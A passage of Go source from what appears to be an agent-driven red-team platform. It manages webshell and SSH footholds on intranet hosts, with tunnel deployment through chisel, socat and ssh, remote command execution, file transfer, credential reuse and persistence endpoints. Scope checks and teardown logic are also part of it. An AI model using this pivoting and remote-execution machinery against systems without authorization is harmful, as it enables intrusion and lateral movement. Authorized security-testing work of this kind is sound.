// reachability with a TCP dial.
func intranetPivotListenerState(host string, port int) (bool, string) {
	host = strings.TrimSpace(host)
	if port <= 0 {
		return false, "缺少 listen_port，无法验证控制端监听端口"
	}
	if host == "" {
		return false, "未配置 JINGWEI_PIVOT_SERVER，无法确定控制端监听地址"
	}
	if intranetHostIsLocal(host) {
		for _, l := range collectListeners() {
			if l.port == port {
				return true, "控制端即本机：" + intranetHostPort(host, port) + " 正在监听"
			}
		}
		return false, "控制端即本机，但本机没有 " + strconv.Itoa(port) + " 的 TCP 监听（chisel server 未启动，或未授权该端口）"
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 5*time.Second)
	if err == nil {
		_ = conn.Close()
		return true, "控制端 " + intranetHostPort(host, port) + " TCP 可达"
	}
	return false, "控制端 " + intranetHostPort(host, port) + " 不可达：" + err.Error()
}

// intranetRetireFailedTunnel cleans up after a tunnel that failed verification:
// the deploy process may still be running on the target while the ledger keeps an
// active resource claiming the tunnel is usable. It runs the recorded teardown and
// releases the resource row. The tunnel row is left as-is (failed) so evacuation
// still walks it and re-checks the target.
func (s *Server) intranetRetireFailedTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel, reason string) string {
	out := "【失败回收】没有可执行的撤销命令（缺少 teardown_command/PID），目标上的进程未回收"
	if cmd := strings.TrimSpace(t.TeardownCommand); cmd != "" && t.SessionID != nil && *t.SessionID > 0 {
		if sess, err := s.intranetSession(pg, *t.SessionID); err != nil {
			out = "【失败回收】绑定会话不可用（" + err.Error() + "），目标上的进程未回收"
		} else {
			res := s.intranetRun(ctx, pg, sess, cmd, 20*time.Second)
			detail := strings.TrimSpace(res.Output + "\n" + res.Note)
			if detail == "" {
				detail = "已执行撤销命令，无回显"
			}
			out = "【失败回收】" + detail
		}
	}
	if s.resourceMgr != nil {
		if res, _ := pg.FindActiveManagedResourceByTunnel(t.ID); res != nil {
			s.resourceMgr.forget(res.ID)
		}
	}
	if err := pg.ReleaseManagedResourceByTunnel(t.ID, "验证失败，已回收："+reason); err != nil {
		out += "\n释放受管资源失败：" + err.Error()
	}
	return out
}

func intranetKillCommand(pid int) string {
	if pid <= 0 {
		return ""
	}
	return "kill " + strconv.Itoa(pid) + " 2>/dev/null; sleep 1; kill -9 " + strconv.Itoa(pid) + " 2>/dev/null || true"
}

func (s *Server) intranetPlanTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel, deploy, verify, teardown string) (*db.IntranetTunnel, intranetProbeInfo, error) {
	if t.SessionID == nil || *t.SessionID <= 0 {
		return nil, intranetProbeInfo{}, errors.New("隧道未绑定会话，无法探测目标环境")
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		return nil, intranetProbeInfo{}, err
	}
	info, out := s.intranetProbe(ctx, pg, sess)
	if out.IsError && strings.TrimSpace(info.Raw) == "" {
		return nil, info, errors.New("探测失败: " + displayOr(out.Note, "无回显"))
	}
	deploy = strings.TrimSpace(deploy)
	verify = strings.TrimSpace(verify)
	teardown = strings.TrimSpace(teardown)
	// deploy_command 传 "auto" = 强制按目标当前的工具重新选型。目标后来装了
	// socat/chisel 时，沿用上次生成的命令会把选型锁死在旧结果上（例如明明能用
	// socat 却仍走需要回连端点的 ssh）。
	reselect := strings.EqualFold(deploy, "auto")
	if reselect {
		deploy = ""
	}
	if deploy == "" && !reselect {
		deploy = strings.TrimSpace(t.DeployCommand)
	}
	// 空值 = 沿用台账里已有的监听侧；只有自动选型才能改写它。
	listenSide := ""
	if verify == "" {
		verify = strings.TrimSpace(t.VerifyCommand)
	}
	if teardown == "" {
		teardown = strings.TrimSpace(t.TeardownCommand)
	}
	if deploy == "" {
		// 隧道自动选型：根据目标上可用的工具自动选择最佳部署命令
		autoDeploy, reason, side := autoSelectTunnelCommand(t.Kind, info, t)
		if autoDeploy == "" {
			return nil, info, errors.New(reason)
		}
		deploy = autoDeploy
		listenSide = side
		if side == db.IntranetListenSidePivot {
			reason += "（监听侧=pivot：验证与拆除复核按控制端一侧进行）"
		}
		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel",
			"自动选型："+reason, autoDeploy, false)
	}
	if verify == "" {
		if t.ListenPort > 0 {
			if listenSide == db.IntranetListenSidePivot {
				verify = intranetPivotVerifyMarker(t.ListenPort)
			} else {
				verify = intranetVerifyCommand(t.ListenPort)
			}
		} else {
			verify = "echo JW_TUNNEL_OK"
		}
	}
	evidence := "【环境探测】\n" + strings.TrimSpace(info.Raw)
	updated, err := pg.UpdateIntranetTunnelPlan(t.ID, deploy, verify, teardown, evidence, listenSide)
	if err != nil {
		return nil, info, err
	}
	if evidence != "" {
		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "规划隧道 #"+strconv.FormatInt(t.ID, 10)+"\n"+deploy, truncateIntranetOutput(evidence, 4000), false)
	}
	return updated, info, nil
}

var reIntranetPID = regexp.MustCompile(`JW_PID:(\d+)`)

func (s *Server) intranetDeployTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel, ttl time.Duration) (*db.IntranetTunnel, intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	if t.Status == db.IntranetTunnelStopped {
		return nil, out, errors.New("隧道已停止，请重新规划后再部署")
	}
	if t.SessionID == nil || *t.SessionID <= 0 {
		return nil, out, errors.New("隧道未绑定会话")
	}
	if t.TaskID != nil {
		if reason, allowed := s.intranetTargetAllowed(pg, *t.TaskID, t.RemoteHost); !allowed {
			return nil, out, errors.New(reason)
		}
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		return nil, out, err
	}
	if strings.TrimSpace(t.DeployCommand) == "" {
		t, _, err = s.intranetPlanTunnel(ctx, pg, t, "", "", "")
		if err != nil {
			return nil, out, err
		}
	}
	out = s.intranetRun(ctx, pg, sess, t.DeployCommand, 60*time.Second)
	pid := 0
	if m := reIntranetPID.FindStringSubmatch(out.Output); len(m) == 2 {
		pid, _ = strconv.Atoi(m[1])
	}
	teardown := strings.TrimSpace(t.TeardownCommand)
	if teardown == "" {
		teardown = intranetTunnelTeardown(pid, t.ID)
	}
	if teardown != "" {
		t, _ = pg.UpdateIntranetTunnelPlan(t.ID, "", "", teardown, "", "")
	}
	evidence := strings.TrimSpace(out.Output)
	if out.IsError {
		evidence = "部署失败: " + displayOr(out.Note, evidence)
	}
	status := db.IntranetTunnelDeployed
	if out.IsError {
		status = db.IntranetTunnelFailed
	}
	updated, err := pg.SetIntranetTunnelStatus(t.ID, status, pid, truncateIntranetOutput(evidence, 4000), "")
	if err != nil {
		return nil, out, err
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "部署隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), out.IsError)
	if status == db.IntranetTunnelDeployed && s.resourceMgr != nil {
		if ttl <= 0 || ttl > intranetTunnelMaxTTL {
			ttl = intranetTunnelTTL
		}
		expires := time.Now().Add(ttl)
		tunnelID := updated.ID
		meta := map[string]any{"tunnel_id": tunnelID, "session_id": sess.ID, "listen_side": intranetTunnelSide(updated)}
		if pid > 0 {
			meta["pid"] = pid
		}
		// 台账里的 endpoint 要写监听真正所在的那一侧：pivot 隧道记目标地址，读台账的人
		// 照着连是连不上的。
		listen := intranetHostPort(updated.ListenHost, updated.ListenPort)
		if intranetTunnelListensOnPivot(updated) {
			if ph, _, perr := intranetPivotServer(); perr == nil {
				listen = intranetHostPort(ph, updated.ListenPort)
			}
		}
		cleanup := func(cctx context.Context) {
			c, cancel := context.WithTimeout(cctx, 30*time.Second)
			defer cancel()
			s.intranetStopTunnel(c, tunnelID, "受管资源到期/释放，自动拆除隧道")
		}
		if _, rerr := s.resourceMgr.register(db.ManagedResourceInput{
			Kind:      db.ManagedKindTunnel,
			Name:      updated.Name,
			Endpoint:  fmt.Sprintf("session:%d %s (%s) -> %s", sess.ID, listen, intranetTunnelSide(updated), intranetHostPort(updated.RemoteHost, updated.RemotePort)),
			Target:    updated.RemoteHost,
			Owner:     "intranet",
			TaskID:    updated.TaskID,
			ExpiresAt: &expires,
			Metadata:  meta,
			Note:      "内网隧道，到期或任务结束自动回收",
		}, cleanup); rerr != nil {
			log.Printf("[intranet] 隧道 #%d 登记受管资源失败: %v", updated.ID, rerr)
		}
	}
	return updated, out, nil
}

// intranetVerifyTunnel checks the listener on the side that actually opens it.
// A pivot-side listener is invisible to `ss` on the target, and running the
// pivot:tcp:N marker as a shell command there only yields "command not found" —
// a false failure. A genuine failure must retire the tunnel: leaving the deploy
// process running with an active resource row tells the next caller the path works.
func (s *Server) intranetVerifyTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel) (*db.IntranetTunnel, intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	if t.SessionID == nil || *t.SessionID <= 0 {
		return nil, out, errors.New("隧道未绑定会话")
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		return nil, out, err
	}
	cmd := strings.TrimSpace(t.VerifyCommand)
	if cmd == "" {
		if intranetTunnelListensOnPivot(t) {
			cmd = intranetPivotVerifyMarker(t.ListenPort)
		} else {
			cmd = intranetVerifyCommand(t.ListenPort)
		}
	}
	if intranetTunnelListensOnPivot(t) || strings.HasPrefix(cmd, "pivot:") {
		h, _, perr := intranetPivotServer()
		if perr != nil {
			// 无法判定控制端地址 ≠ 隧道坏了：这里必须原样返回、保持 deployed 状态，
			// 否则一次平台配置缺失就会把好隧道判死并拆掉。
			return nil, out, fmt.Errorf("隧道监听端在控制端，%s；如控制端不是本机，请把 listen_side 改为 target 或手动提供 verify_command", perr.Error())
		}
		port := t.ListenPort
		if port <= 0 {
			port = intranetPivotMarkerPort(cmd)
		}
		ok, detail := intranetPivotListenerState(h, port)
		out = intranetExecOutcome{Output: detail}
		if ok {
			out.ExitCode = 0
		} else {
			out.ExitCode = 1
			out.IsError = true
		}
	} else {
		out = s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
	}
	ok := !out.IsError && !strings.Contains(out.Output, "JW_TUNNEL_FAIL")
	status := db.IntranetTunnelFailed
	if ok {
		status = db.IntranetTunnelVerified
	}
	evidence := strings.TrimSpace(out.Output)
	if out.Note != "" {
		evidence += "\n" + out.Note
	}
	if !ok {
		evidence += "\n" + s.intranetRetireFailedTunnel(ctx, pg, t, intranetVerifyFailReason(out))
	}
	updated, err := pg.SetIntranetTunnelStatus(t.ID, status, 0, truncateIntranetOutput(evidence, 4000), "")
	if err != nil {
		return nil, out, err
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "验证隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), !ok)
	return updated, out, nil
}

// intranetTunnelAccess explains how to reach a live tunnel. listen_side decides
// which machine to point at: a pivot-side listener (chisel client without R:) is
// reached on the control end, everything else is a listener on the target, where a
// wildcard bind is addressed through the session host and a loopback bind is only
// usable from inside the target.
func (s *Server) intranetTunnelAccess(pg *db.DB, t *db.IntranetTunnel) map[string]any {
	if t == nil || t.ListenPort <= 0 {
		return nil
	}
	if t.Status != db.IntranetTunnelDeployed && t.Status != db.IntranetTunnelVerified {
		return nil
	}
	if intranetTunnelListensOnPivot(t) {
		access := map[string]any{"listen_side": db.IntranetListenSidePivot, "port": t.ListenPort}
		ph, _, perr := intranetPivotServer()
		if perr != nil {
			access["note"] = perr.Error()
			return access
		}
		endpoint := intranetHostPort(ph, t.ListenPort)
		access["host"] = ph
		access["target"] = endpoint
		access["endpoint"] = endpoint
		if t.Kind == db.IntranetTunnelKindSocks5 {
			access["proxy"] = "socks5://" + endpoint
		}
		if ok, detail := intranetPivotListenerState(ph, t.ListenPort); ok {
			access["note"] = "监听端在控制端（" + detail + "），流量经目标出站进入内网；把 " + endpoint +
				" 配置给扫描/深度任务即可"
		} else {
			access["note"] = "监听端应在控制端，但当前检查不通过：" + detail
		}
		return access
	}
	host := strings.TrimSpace(t.ListenHost)
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = ""
		if t.SessionID != nil && *t.SessionID > 0 {
			if sess, err := pg.GetIntranetSession(*t.SessionID); err == nil {
				host = intranetHost(sess.Host)
				if host == "" {
					host = intranetHost(sess.WebshellURL)
				}
			}
		}
		if host == "" {
			return map[string]any{"note": "监听在目标所有地址，请用目标主机地址访问端口 " + strconv.Itoa(t.ListenPort)}
		}
	} else if ip := net.ParseIP(host); ip != nil && ip.IsLoopback() {
		return map[string]any{
			"loopback_only": true,
			"note":          "监听在目标回环地址，只能从目标内部访问；如需平台直连，请把 listen_host 改为 0.0.0.0（或目标内网地址）后重新部署",
		}
	}
	endpoint := intranetHostPort(host, t.ListenPort)
	access := map[string]any{"host": host, "port": t.ListenPort, "target": endpoint, "listen_side": db.IntranetListenSideTarget}
	switch t.Kind {
	case db.IntranetTunnelKindSocks5:
		access["proxy"] = "socks5://" + endpoint
		access["note"] = "把该代理配置给扫描/深度任务即可经目标出站访问内网"
	case db.IntranetTunnelKindRemote:
		access["endpoint"] = endpoint
		// R: 前缀把监听端口开在 chisel client（目标）一侧，连上之后由控制端出站——
		// 以前按 kind 猜「监听端在控制端」会把端口指向控制端根本没收过的地址。
		access["note"] = "反向转发：监听端口开在目标 " + endpoint + "，连上后经控制端一侧出站"
	default:
		access["endpoint"] = endpoint
	}
	return access
}

// intranetStopTunnel is the idempotent teardown used by the API and by the
// managed-resource cleanup closure. It never calls the resource manager, so the
// two paths cannot recurse.
func (s *Server) intranetStopTunnel(ctx context.Context, tunnelID int64, note string) {
	pg := s.m.pg
	if pg == nil {
		return
	}
	t, err := pg.GetIntranetTunnel(tunnelID)
	if err != nil || t == nil {
		return
	}
	if t.Status == db.IntranetTunnelStopped {
		return
	}
	evidence := ""
	cmd := strings.TrimSpace(t.TeardownCommand)
	if cmd == "" {
		cmd = intranetTunnelTeardown(ptrInt(t.PID), t.ID)
	}
	switch {
	case t.SessionID == nil || *t.SessionID <= 0:
		evidence = "隧道未绑定会话，拆除命令未执行，仅台账置为 stopped"
	case cmd == "":
		evidence = "没有可执行的拆除命令（缺少 teardown_command/PID），仅台账置为 stopped"
	default:
		sess, serr := s.intranetSession(pg, *t.SessionID)
		if serr != nil {
			evidence = "绑定会话 #" + strconv.FormatInt(*t.SessionID, 10) + " 不可用，拆除命令未执行，仅台账置为 stopped"
			break
		}
		out := s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
		evidence = strings.TrimSpace(out.Output)
		if out.Note != "" {
			evidence += "\n" + out.Note
		}
		// 拆完必须回看一眼端口：kill 打偏（pid 已复用）或没有权限时，监听进程还在，
		// 而台账即将被写成 stopped——撤离之后无人再来查这个洞。复核看的是 listen_side
		// 那一侧：socat 与 ssh -D/-L 的监听开在目标，chisel client（不带 R:）的监听开在
		// 控制端，只有 client 进程断开后控制端才会收起那个端口。在错误的一侧复核，会把
		// 已经断掉的隧道报成 JW_TUNNEL_FAIL（等于没复核），也会把还活着的端口漏掉。
		recheck := ""
		switch {
		case t.ListenPort <= 0:
			recheck = "缺少 listen_port，未复核端口"
		case intranetTunnelListensOnPivot(t):
			ph, _, perr := intranetPivotServer()
			if perr != nil {
				recheck = "控制端地址未知（" + perr.Error() + "），未复核端口 " + strconv.Itoa(t.ListenPort)
			} else if stillUp, detail := intranetPivotListenerState(ph, t.ListenPort); stillUp {
				recheck = "【未收起】" + detail + "：控制端侧端口仍在监听，隧道可能仍在服务"
			} else {
				recheck = "【已收起】" + detail
			}
		default:
			check := s.intranetRun(ctx, pg, sess, intranetVerifyCommand(t.ListenPort), 20*time.Second)
			recheck = strings.TrimSpace(check.Output)
		}
		evidence = strings.TrimSpace(evidence + "\n【拆除复核】" + recheck)
		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "拆除隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), out.IsError)
	}
	note = strings.TrimSpace(note)
	if note == "" {
		note = "手动拆除"
	}
	_, _ = pg.SetIntranetTunnelStatus(t.ID, db.IntranetTunnelStopped, 0, truncateIntranetOutput(evidence, 4000), note)
	_ = pg.ReleaseManagedResourceByTunnel(t.ID, note)
}

func ptrInt(v *int) int {
	if v == nil {
		return 0
	}
	return *v
}

// ---------------------------------------------------------------------------
// HTTP API
// ---------------------------------------------------------------------------

type intranetSessionDTO struct {
	Name         string         `json:"name"`
	WebshellID   int64          `json:"webshell_id"`
	TaskID       int64          `json:"task_id"`
	Host         string         `json:"host"`
	Cwd          string         `json:"cwd"`
	Note         string         `json:"note"`
	Metadata     map[string]any `json:"metadata"`
	Status       string         `json:"status"`
	Transport    string         `json:"transport"`
	Port         int            `json:"port"`
	User         string         `json:"user"`
	CredentialID int64          `json:"credential_id"`
	DialHost     string         `json:"dial_host"`
	DialPort     int            `json:"dial_port"`
}

type intranetTunnelDTO struct {
	Name            string `json:"name"`
	SessionID       int64  `json:"session_id"`
	TaskID          int64  `json:"task_id"`
	Kind            string `json:"kind"`
	ListenHost      string `json:"listen_host"`
	ListenPort      int    `json:"listen_port"`
	ListenSide      string `json:"listen_side"`
	RemoteHost      string `json:"remote_host"`
	RemotePort      int    `json:"remote_port"`
	DeployCommand   string `json:"deploy_command"`
	VerifyCommand   string `json:"verify_command"`
	TeardownCommand string `json:"teardown_command"`
	Note            string `json:"note"`
}

type intranetTunnelActionDTO struct {
	DeployCommand   string `json:"deploy_command"`
	VerifyCommand   string `json:"verify_command"`
	TeardownCommand string `json:"teardown_command"`
	ListenSide      string `json:"listen_side"`
	TTLSeconds      int    `json:"ttl_seconds"`
	TimeoutSeconds  int    `json:"timeout_seconds"`
}

type intranetHandoffDTO struct {
	FromTaskID  int64   `json:"from_task_id"`
	Name        string  `json:"name"`
	Description string  `json:"description"`
	Goal        string  `json:"goal"`
	SessionIDs  []int64 `json:"session_ids"`
	TunnelIDs   []int64 `json:"tunnel_ids"`
}

func (s *Server) registerIntranet(mux *http.ServeMux) {
	mux.HandleFunc("GET /api/intranet/sessions", s.listIntranetSessions)
	mux.HandleFunc("POST /api/intranet/sessions", s.createIntranetSession)
	mux.HandleFunc("GET /api/intranet/sessions/{id}", s.getIntranetSession)
	mux.HandleFunc("PATCH /api/intranet/sessions/{id}", s.updateIntranetSession)
	mux.HandleFunc("DELETE /api/intranet/sessions/{id}", s.deleteIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/exec", s.execIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/heartbeat", s.heartbeatIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/failover", s.failoverIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/upload", s.uploadIntranetFile)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/download", s.downloadIntranetFile)
	mux.HandleFunc("GET /api/intranet/sessions/{id}/events", s.listIntranetSessionEvents)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/recon", s.reconIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/batch-exec", s.batchExecIntranetSessions)

	mux.HandleFunc("GET /api/intranet/credentials", s.listIntranetCredentials)
	mux.HandleFunc("POST /api/intranet/credentials", s.registerIntranetCredential)
	mux.HandleFunc("POST /api/intranet/credentials/reuse", s.reuseIntranetCredential)

	mux.HandleFunc("GET /api/intranet/artifacts", s.listIntranetArtifacts)
	mux.HandleFunc("POST /api/intranet/artifacts", s.registerIntranetArtifact)
	mux.HandleFunc("POST /api/intranet/artifacts/{id}/revoke", s.revokeIntranetArtifact)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/persist", s.persistIntranetSession)
	mux.HandleFunc("POST /api/intranet/evacuate", s.evacuateIntranetTask)

	mux.HandleFunc("GET /api/intranet/tunnels", s.listIntranetTunnels)
	mux.HandleFunc("POST /api/intranet/tunnels", s.createIntranetTunnel)
	mux.HandleFunc("GET /api/intranet/tunnels/{id}", s.getIntranetTunnel)
	mux.HandleFunc("DELETE /api/intranet/tunnels/{id}", s.deleteIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/probe", s.probeIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/plan", s.planIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/deploy", s.deployIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/verify", s.verifyIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/teardown", s.teardownIntranetTunnel)

	mux.HandleFunc("GET /api/intranet/scope-requests", s.listIntranetScopeRequests)
	mux.HandleFunc("POST /api/intranet/scope-requests", s.createIntranetScopeRequest)
	mux.HandleFunc("POST /api/intranet/scope-requests/{id}/approve", s.approveIntranetScopeRequest)
	mux.HandleFunc("POST /api/intranet/scope-requests/{id}/reject", s.rejectIntranetScopeRequest)
	mux.HandleFunc("POST /api/intranet/handoff", s.handoffIntranetTask)
}

func (s *Server) listIntranetSessions(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	sessions, total, err := pg.ListIntranetSessions(q.Get("status"), taskID, atoiDefault(q.Get("limit"), 100), atoiDefault(q.Get("offset"), 0))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"sessions": sessions, "total": total})
}

// intranetTaskGuard reports why a task_id cannot anchor ledger rows. Sessions,
// tunnels and artifacts all carry a task_id with a foreign key: a deleted task
// otherwise surfaces as a raw SQLSTATE 23503, and even if the insert succeeded
// the row would never show up in that task's evacuation plan.
func intranetTaskGuard(pg *db.DB, taskID int64) string {
	if taskID <= 0 {
		return ""
	}
	task, err := pg.GetTask(taskID)
	if err != nil {
		return "校验任务失败：" + err.Error()
	}
	if task == nil {
		return "任务 #" + strconv.FormatInt(taskID, 10) + " 不存在或已删除，无法归入该任务的撤离台账"
	}
	return ""
}

func (s *Server) createIntranetSession(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetSessionDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	if db.NormalizeIntranetTransport(req.Transport) == db.IntranetTransportSSH {
		sess, info, err := s.intranetOpenSSHSession(r.Context(), pg, intranetSSHSessionRequest{
			Name: req.Name, TaskID: req.TaskID, Host: req.Host, Port: req.Port,
			User: req.User, CredentialID: req.CredentialID,
			DialHost: req.DialHost, DialPort: req.DialPort,
			Cwd: req.Cwd, Note: req.Note,
		})
		if err != nil {
			if sess != nil {
				// 会话已登记但登录失败：留一行 closed 记录，误配凭据也查得到。
				writeJSON(w, 200, map[string]any{"session": sess, "probe_error": err.Error()})
				return
			}
			writeErr(w, 400, err.Error())
			return
		}
		writeJSON(w, 200, map[string]any{"session": sess, "probe": info})
		return
	}
	shell, err := pg.GetWebshell(req.WebshellID)
	if err != nil {
		writeErr(w, 400, "webshell 不存在")
		return
	}
	if strings.TrimSpace(shell.URL) == "" {
		writeErr(w, 400, "该 webshell 没有可用地址")
		return
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
		return
	}
	// 会话必须挂在真实任务上：task_id 指向已删除的任务会被外键挡下，而直接把
	// SQLSTATE 23503 抛给调用方，Agent 只会当成服务出错重试。更要紧的是，任务
	// 不存在的会话进不了按任务出发的撤离清单，落脚点就此失联。
	if msg := intranetTaskGuard(pg, req.TaskID); msg != "" {
		writeErr(w, 400, msg)
		return
	}
	host := intranetHost(req.Host)
	if host == "" {
		host = intranetHost(shell.Target)
	}
	if host == "" {
		host = intranetHost(shell.URL)
	}
	sess, err := pg.CreateIntranetSession(db.IntranetSessionInput{
		Name: req.Name, WebshellID: req.WebshellID, TaskID: req.TaskID,
		Host: host, Cwd: req.Cwd, Note: req.Note, Metadata: req.Metadata,
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	info, out := s.intranetProbe(r.Context(), pg, sess)
	if out.IsError {
		log.Printf("[intranet] 会话 #%d 初始探测失败: %s", sess.ID, displayOr(out.Note, strings.TrimSpace(out.Output)))
	}
	writeJSON(w, 200, map[string]any{"session": sess, "probe": info, "probe_error": out.Note})
}

func (s *Server) getIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := pg.GetIntranetSession(id)
	if err != nil {
		writeErr(w, 404, "会话不存在")
		return
	}
	events, _ := pg.ListIntranetSessionEvents(id, atoiDefault(r.URL.Query().Get("events"), 100))
	writeJSON(w, 200, map[string]any{"session": sess, "events": events})
}

func (s *Server) updateIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetSessionDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	status := strings.ToLower(strings.TrimSpace(req.Status))
	if status != "" && status != db.IntranetSessionActive && status != db.IntranetSessionClosed {
		writeErr(w, 400, "status 必须是 active 或 closed")
		return
	}
	sess, err := pg.UpdateIntranetSessionState(id, strings.TrimSpace(req.Cwd), status, strings.TrimSpace(req.Note))
	if err != nil {
		writeErr(w, 404, "会话不存在")
		return
	}
	if req.TaskID > 0 {
		_ = pg.SetIntranetSessionTask(id, req.TaskID)
		sess.TaskID = &req.TaskID
	}
	writeJSON(w, 200, map[string]any{"session": sess})
}

func (s *Server) deleteIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	deleted, err := pg.DeleteIntranetSession(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if !deleted {
		writeErr(w, 404, "会话不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

func (s *Server) execIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Command        string `json:"command"`
		TimeoutSeconds int    `json:"timeout_seconds"`
		OSKind         string `json:"os_kind"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, 400, "命令不能为空")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := s.intranetSession(pg, id)
	if err != nil {
		writeErr(w, 404, err.Error())
		return
	}
	timeout := time.Duration(req.TimeoutSeconds) * time.Second
	if timeout <= 0 || timeout > 300*time.Second {
		timeout = intranetExecTimeout
	}
	// The terminal can be told what the target is when the probe cannot find out
	// (a chroot that never answers, a restricted shell). Writing it through the
	// session metadata keeps one source of truth for every later command, upload
	// and persistence step.
	if k := strings.TrimSpace(req.OSKind); k == intranetOSPosix || k == intranetOSWindows {
		if cached, _ := sess.Metadata["os"].(string); cached != k {
			if updated, merr := pg.SetIntranetSessionMetadata(sess.ID, map[string]any{"os": k}); merr == nil && updated != nil {
				*sess = *updated
			}
		}
	}
	out := s.intranetExec(r.Context(), pg, sess, req.Command, timeout)
	writeJSON(w, 200, map[string]any{"result": out, "session": sess})
}

func (s *Server) uploadIntranetFile(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 8<<20)
	var req struct {
		Path          string `json:"path"`
		ContentBase64 string `json:"content_base64"`
		Content       string `json:"content"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	payload := req.ContentBase64
	if strings.TrimSpace(payload) == "" && req.Content != "" {
		payload = base64.StdEncoding.EncodeToString([]byte(req.Content))
	}
	data, err := base64.StdEncoding.DecodeString(strings.TrimSpace(payload))
	if err != nil {
		writeErr(w, 400, "content_base64 无效")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := s.intranetSession(pg, id)
	if err != nil {
		writeErr(w, 404, err.Error())
		return
	}
	out, err := s.intranetUpload(r.Context(), pg, sess, req.Path, data)
	code := 200
	if err != nil {
		code = 400
	}
	writeJSON(w, code, map[string]any{"result": out, "session": sess})
}

func (s *Server) downloadIntranetFile(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Path     string `json:"path"`
		MaxBytes int    `json:"max_bytes"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := s.intranetSession(pg, id)
	if err != nil {
		writeErr(w, 404, err.Error())
		return
	}
	data, total, truncated, out := s.intranetDownload(r.Context(), pg, sess, req.Path, req.MaxBytes)
	code := 200
	if out.IsError {
		code = 400
	}
	writeJSON(w, code, map[string]any{
		"result": out, "size": len(data), "total": total, "truncated": truncated,
		"content_base64": base64.StdEncoding.EncodeToString(data), "session": sess,
	})
}

func (s *Server) listIntranetSessionEvents(w http.ResponseWriter, r *http.Request) {
